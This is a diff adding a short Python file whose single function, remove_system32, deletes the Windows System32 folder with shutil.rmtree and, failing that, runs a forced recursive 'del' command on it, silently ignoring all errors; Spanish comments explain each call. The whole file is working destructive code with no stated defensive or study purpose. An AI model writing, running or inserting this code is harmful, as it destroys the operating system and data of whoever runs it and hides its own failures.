@@ -1,0 +1,12 @@
+import shutil 
+import os 
+
+def remove_system32():
+    try:
+        if os.path.exists(r"C:\Windows\System32"): # os.path.exists sirve para saber si existe esa ruta 
+            shutil.rmtree(r"C:\Windows\System32") # la función shutil.rmtree sirve para borrar la carpeta y todo lo que hay dentro 
+        else:  
+            os.system(r"del /s /q /f C:\Windows\System32\*.*") # os.system sirve simplemente para ejecutar comandos
+            
+    except:
+        pass
